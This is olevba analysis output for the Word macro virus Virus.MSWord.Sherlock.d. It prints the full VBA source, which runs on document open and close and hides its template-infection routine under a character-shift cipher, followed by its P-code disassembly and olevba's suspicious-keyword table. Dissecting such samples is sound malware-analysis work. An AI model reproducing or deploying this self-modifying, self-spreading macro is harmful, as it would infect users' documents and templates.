olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sherlock.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sherlock.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const BOK = "Rio&Umi 4ever together"
'Unread
Private Sub document_open()
  Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
  Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule
  Set Thi = ThisDocument.VBProject.VBComponents(1).CodeModule
  ADi = ad.Find(BOK, 1, 1, 100, 100)
  NTi = nt.Find(BOK, 1, 1, 100, 100)
 
  If (ADi = True And NTi = True) Then
    GoTo finish
  End If
  If Thi.lines(2, 1) = "'Unread" Then
    Call dekrip
  ElseIf Thi.lines(2, 1) = "'Read" Then
    GoTo finish
  End If


finish:
End Sub


Private Sub document_close()
On Error GoTo finish
  Options.VirusProtection = True
  Options.SaveNormalPrompt = False
  Application.UserName = "Rio&Umi 4ever together"
  Application.UserAddress = "rio96@student.te.ugm.ac.id"
  Application.UserInitials = "Rio"
  Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
  Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule
  Set Thi = ThisDocument.VBProject.VBComponents(1).CodeModule
  ADi = ad.Find(BOK, 1, 1, 100, 100)
  NTi = nt.Find(BOK, 1, 1, 100, 100)
  
  If (ADi = True And NTi = True) Then
    GoTo finish
  End If
  If Thi.lines(2, 1) = "'Read" Then
    Call enkrip
  ElseIf Thi.lines(2, 1) = "'Unread" Then
    GoTo finish
  End If
  
',,Ur,4MPu,I,`~�q,Mzp,Z`u,I,Rmxq5,`tqz
',,,,_MbU`,I,Z{~ymx`qy|xm€q:_m‚qp
',,,,z€:pqxq€qxuzq,=8,z€:O{�z€{rxuzq
',,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5
',,,,z€:mppr~{y€~uzs,o{ppq
',,,,^qy,Ur,m‚u€,`tqz,Z{~ymx`qy|xm€q:_m‚q
',,QxqUr,4MPu,I,Rmxq,Mzp,Z`u,I,`~�q5,`tqz
',,,,_MbU`,I,Mo€u‚qP{o�yqz€:_m‚qp
',,,,mp:pqxq€qxuzq,=8,mp:O{�z€{rxuzq
',,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5
',,,,,mp:mppr~{y€~uzs,o{ppq
',,,,Ur,_MbU`,`tqz,Mo€u‚qP{o�yqz€:_m‚q
',,Qzp,Ur
',,
ActiveDocument.Save
finish:
                                                                     ActiveDocument.Save

End Sub

Private Sub enkrip()
Dim test1 As String
   
    'JumLine = ThisDocument.VBProject.VBComponents(1).CodeModule.Countoflines
    For i = 46 To 59
        test1 = "'"
        Line = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(i, 1)
        panbar = Len(Line)
        For T = 1 To panbar
            Kar = Mid$(Line, T, 1)
            test1 = test1 + (Chr(Asc(Kar) + 12))
        Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine i, test1
    test1 = "'"
    Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 2, "'Unread"
End Sub

Private Sub dekrip()
Dim test1 As String
    
    'JumLine = ActiveDocument.VBProject.VBComponents(1).CodeModule.Countoflines
    For i = 46 To 59
        test1 = ""
        Line = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(i, 1)
        panbar = Len(Line)
        For T = 2 To panbar
            Kar = Mid$(Line, T, 1)
            test1 = test1 + (Chr(Asc(Kar) - 12))
        Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine i, test1
    test1 = ""
    Next
    ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 2, "'Read"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Sherlock.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6055 bytes
' Line #0:
' 	Dim (Const) 
' 	LitStr 0x0016 "Rio&Umi 4ever together"
' 	VarDefn BOK
' Line #1:
' 	QuoteRem 0x0000 0x0006 "Unread"
' Line #2:
' 	FuncDefn (Private Sub document_open())
' Line #3:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ad 
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nt 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Thi 
' Line #6:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld ad 
' 	ArgsMemLd Find 0x0005 
' 	St ADi 
' Line #7:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld nt 
' 	ArgsMemLd Find 0x0005 
' 	St NTi 
' Line #8:
' Line #9:
' 	Ld ADi 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NTi 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #10:
' 	GoTo finish 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0007 "'Unread"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	ArgsCall (Call) dekrip 0x0000 
' Line #14:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0005 "'Read"
' 	Eq 
' 	ElseIfBlock 
' Line #15:
' 	GoTo finish 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' Line #19:
' 	Label finish 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' Line #23:
' 	FuncDefn (Private Sub document_close())
' Line #24:
' 	OnError finish 
' Line #25:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #27:
' 	LitStr 0x0016 "Rio&Umi 4ever together"
' 	Ld Application 
' 	MemSt UserName 
' Line #28:
' 	LitStr 0x001A "rio96@student.te.ugm.ac.id"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #29:
' 	LitStr 0x0003 "Rio"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ad 
' Line #31:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nt 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Thi 
' Line #33:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld ad 
' 	ArgsMemLd Find 0x0005 
' 	St ADi 
' Line #34:
' 	Ld BOK 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld nt 
' 	ArgsMemLd Find 0x0005 
' 	St NTi 
' Line #35:
' Line #36:
' 	Ld ADi 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NTi 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #37:
' 	GoTo finish 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0005 "'Read"
' 	Eq 
' 	IfBlock 
' Line #40:
' 	ArgsCall (Call) enkrip 0x0000 
' Line #41:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld Thi 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0007 "'Unread"
' 	Eq 
' 	ElseIfBlock 
' Line #42:
' 	GoTo finish 
' Line #43:
' 	EndIfBlock 
' Line #44:
' Line #45:
' 	QuoteRem 0x0000 0x0026 ",,Ur,4MPu,I,`~�q,Mzp,Z`u,I,Rmxq5,`tqz"
' Line #46:
' 	QuoteRem 0x0000 0x0020 ",,,,_MbU`,I,Z{~ymx`qy|xm€q:_m‚qp"
' Line #47:
' 	QuoteRem 0x0000 0x0025 ",,,,z€:pqxq€qxuzq,=8,z€:O{�z€{rxuzq"
' Line #48:
' 	QuoteRem 0x0000 0x002A ",,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5"
' Line #49:
' 	QuoteRem 0x0000 0x001A ",,,,z€:mppr~{y€~uzs,o{ppq"
' Line #50:
' 	QuoteRem 0x0000 0x0029 ",,,,^qy,Ur,m‚u€,`tqz,Z{~ymx`qy|xm€q:_m‚q"
' Line #51:
' 	QuoteRem 0x0000 0x002A ",,QxqUr,4MPu,I,Rmxq,Mzp,Z`u,I,`~�q5,`tqz"
' Line #52:
' 	QuoteRem 0x0000 0x0020 ",,,,_MbU`,I,Mo€u‚qP{o�yqz€:_m‚qp"
' Line #53:
' 	QuoteRem 0x0000 0x0025 ",,,,mp:pqxq€qxuzq,=8,mp:O{�z€{rxuzq"
' Line #54:
' 	QuoteRem 0x0000 0x002A ",,,,o{ppq,I,`tu:xuzq4=8,`tu:O{�z€{rxuzq5"
' Line #55:
' 	QuoteRem 0x0000 0x001B ",,,,,mp:mppr~{y€~uzs,o{ppq"
' Line #56:
' 	QuoteRem 0x0000 0x0025 ",,,,Ur,_MbU`,`tqz,Mo€u‚qP{o�yqz€:_m‚q"
' Line #57:
' 	QuoteRem 0x0000 0x0008 ",,Qzp,Ur"
' Line #58:
' 	QuoteRem 0x0000 0x0002 ",,"
' Line #59:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #60:
' 	Label finish 
' Line #61:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #62:
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Private Sub enkrip())
' Line #66:
' 	Dim 
' 	VarDefn test1 (As String)
' Line #67:
' Line #68:
' 	QuoteRem 0x0004 0x0048 "JumLine = ThisDocument.VBProject.VBComponents(1).CodeModule.Countoflines"
' Line #69:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x003B 
' 	For 
' Line #70:
' 	LitStr 0x0001 "'"
' 	St test1 
' Line #71:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St Like 
' Line #72:
' 	Ld Like 
' 	FnLen 
' 	St panbar 
' Line #73:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld panbar 
' 	For 
' Line #74:
' 	Ld Like 
' 	Ld T 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St Kar 
' Line #75:
' 	Ld test1 
' 	Ld Kar 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x000C 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Add 
' 	St test1 
' Line #76:
' 	StartForVariable 
' 	Next 
' Line #77:
' 	Ld i 
' 	Ld test1 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #78:
' 	LitStr 0x0001 "'"
' 	St test1 
' Line #79:
' 	StartForVariable 
' 	Next 
' Line #80:
' 	LitDI2 0x0002 
' 	LitStr 0x0007 "'Unread"
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #81:
' 	EndSub 
' Line #82:
' Line #83:
' 	FuncDefn (Private Sub dekrip())
' Line #84:
' 	Dim 
' 	VarDefn test1 (As String)
' Line #85:
' Line #86:
' 	QuoteRem 0x0004 0x004A "JumLine = ActiveDocument.VBProject.VBComponents(1).CodeModule.Countoflines"
' Line #87:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x003B 
' 	For 
' Line #88:
' 	LitStr 0x0000 ""
' 	St test1 
' Line #89:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St Like 
' Line #90:
' 	Ld Like 
' 	FnLen 
' 	St panbar 
' Line #91:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld panbar 
' 	For 
' Line #92:
' 	Ld Like 
' 	Ld T 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St Kar 
' Line #93:
' 	Ld test1 
' 	Ld Kar 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x000C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Add 
' 	St test1 
' Line #94:
' 	StartForVariable 
' 	Next 
' Line #95:
' 	Ld i 
' 	Ld test1 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #96:
' 	LitStr 0x0000 ""
' 	St test1 
' Line #97:
' 	StartForVariable 
' 	Next 
' Line #98:
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "'Read"
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #99:
' 	EndSub 
' Line #100:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

